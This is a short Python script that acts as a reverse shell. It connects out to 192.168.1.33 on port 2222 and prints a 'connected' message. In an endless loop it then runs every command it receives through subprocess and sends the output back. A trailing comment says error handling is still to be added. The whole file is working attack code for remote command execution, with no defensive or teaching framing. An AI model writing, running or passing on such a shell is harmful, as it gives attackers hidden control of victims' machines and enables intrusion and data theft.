from socket import *

import subprocess

from colorama import Fore 

conn = socket(2,1)

# s  = socket(AF_INET,SOCK_STREAM) #type connection

conn.connect(("192.168.1.33",2222))

print(Fore.YELLOW+"connected ! ! ! "+"\n")

while True:
    Data = conn.recv(123456).decode()
    result = subprocess.getoutput(Data)
    conn.send(result.encode())

conn.close()


#develope with error handling 